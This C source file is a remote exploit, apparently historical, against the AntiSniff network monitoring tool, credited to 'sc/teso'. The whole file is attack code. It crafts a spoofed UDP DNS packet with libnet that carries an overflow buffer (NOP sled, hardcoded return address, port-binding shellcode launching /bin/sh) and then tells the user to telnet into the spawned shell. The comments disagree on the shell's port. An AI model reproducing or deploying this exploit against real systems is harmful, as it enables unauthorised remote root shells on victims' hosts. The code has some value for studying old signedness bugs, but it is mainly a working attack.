/* l0phtl0phe.c - antisniff exploit (1.02 included)
 *
 * -sc/teso
 *
 * gcc -o l0phtl0phe l0phtl0phe.c -Wall -lnet `libnet-config --defines`
 *
 * description:
 * l0pht messed up the fix for their problem in antisniff by not regarding
 * the type signedness properties of the char and int values used. this
 * results in a cool method bypassing the too extra checks (length + strncat).
 * some work on this topic have been done by mixter, (bad results on type
 * casting), but it should be obvious to any security conscious programmers.
 * i'm not stating that they aren't allowed errors, but they should fix it
 * for sure if they're going to fix it at all.  -sc.
 *
 * greetings to all teso, lam3rz, hert, adm, w00w00 and lds ppl.
 */

#include <stdio.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <arpa/nameser.h>
#include <libnet.h>


#define	OFFSET		0xbffef9a0

unsigned int	build_xp (unsigned char *xp);


int
main (int argc, char *argv[])
{
	int		sock;		/* raw socket */
	u_long		src_ip,
			dst_ip;

	unsigned char	xpbuf[512];	/* this one gets complicated now */
	unsigned char	tpack[512];	/* paket buffer */
	unsigned int	pl_len;


	if (argc != 3) {
		printf ("usage: %s <source ip> <dest ip>\n\n", argv[0]);

		exit (EXIT_FAILURE);
	}

	sock = libnet_open_raw_sock (IPPROTO_RAW);
	if (sock == -1) {
		perror ("libnet_open_raw_sock");
		exit (EXIT_FAILURE);
	}

	src_ip  = libnet_name_resolve (argv[1], 0);
	dst_ip  = libnet_name_resolve (argv[2], 0);

	pl_len = build_xp (xpbuf);

	libnet_build_ip (UDP_H + DNS_H + pl_len, 0, 7350, 0, 2, IPPROTO_UDP,
		src_ip, dst_ip, NULL, 0, tpack);
	libnet_build_udp (libnet_get_prand (PRu16), 53, NULL, 0,
		tpack + IP_H);
	libnet_build_dns (libnet_get_prand (PRu16), 0x0000, 1, 0, 0, 0,
		xpbuf, pl_len, tpack + IP_H + UDP_H);
	libnet_do_checksum (tpack, IPPROTO_UDP, UDP_H + DNS_H + pl_len);

	/* they use "udp and dst port 53" as bpf, so we should have no problem
	 */
	libnet_write_ip (sock, tpack, UDP_H + IP_H + DNS_H + pl_len);
	libnet_close_raw_sock (sock);

	printf ("exploitation succeeded.\n");
	printf ("try: \"telnet %s 17664\" now.\n", argv[2]);

	exit (EXIT_SUCCESS);
}


/* build_xp
 *
 * build exploit buffer into buffer pointed to by `xp'.
 */

unsigned int
build_xp (unsigned char *xp)
{




	/* yea yea ugly buffer ;-) */
	unsigned char	buf[] =
		"\x7c\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\xeb\x01"
		"\x7d\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\xeb\x08\x00"
		"\xfe\x10\x10\xff\xbf\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\xeb\x20"
		"\x90\x90\x90\x90"
		"\x3c\xf8\xfe\xbf\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

		/* portshell 17644 portshellcode by smiler & scut */
		"\x31\xc0\xb0\x02\xcd\x80\x09\xc0\x74\x06\x31\xc0"
		"\xfe\xc0\xcd\x80\xeb\x76\x5f\x89\x4f\x10\xfe\xc1"
		"\x89\x4f\x0c\xfe\xc1\x89\x4f\x08\x8d\x4f\x08\xfe"
		"\xc3\xb0\x66\xcd\x80\xfe\xc3\xc6\x47\x10\x10\x66"
		"\x89\x5f\x14\x88\x47\x08\xb0\x45\x66\x89\x47\x16"
		"\x89\x57\x18\x8d\x4f\x14\x89\x4f\x0c\x8d\x4f\x08"
		"\xb0\x66\xcd\x80\x89\x5f\x0c\xfe\xc3\xfe\xc3\xb0"
		"\x66\xcd\x80\x89\x57\x0c\x89\x57\x10\xfe\xc3\xb0"
		"\x66\xcd\x80\x31\xc9\x88\xc3\xb0\x3f\xcd\x80\xfe"
		"\xc1\xb0\x3f\xcd\x80\xfe\xc1\xb0\x3f\xcd\x80\x31"
		"\xd2\x88\x57\x07\x89\x7f\x0c\x89\xfb\x8d\x4f\x0c"
		"\xb0\x0b\xcd\x80\x31\xc0\x99\x31\xdb\x31\xc9\xe8"
		"\x7e\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

	buf[287] = (OFFSET      ) & 0xff;
	buf[288] = (OFFSET >>  8) & 0xff;
	buf[289] = (OFFSET >> 16) & 0xff;
	buf[290] = (OFFSET >> 24) & 0xff;

	memcpy (xp, buf, sizeof (buf));

	return (sizeof (buf));;
}
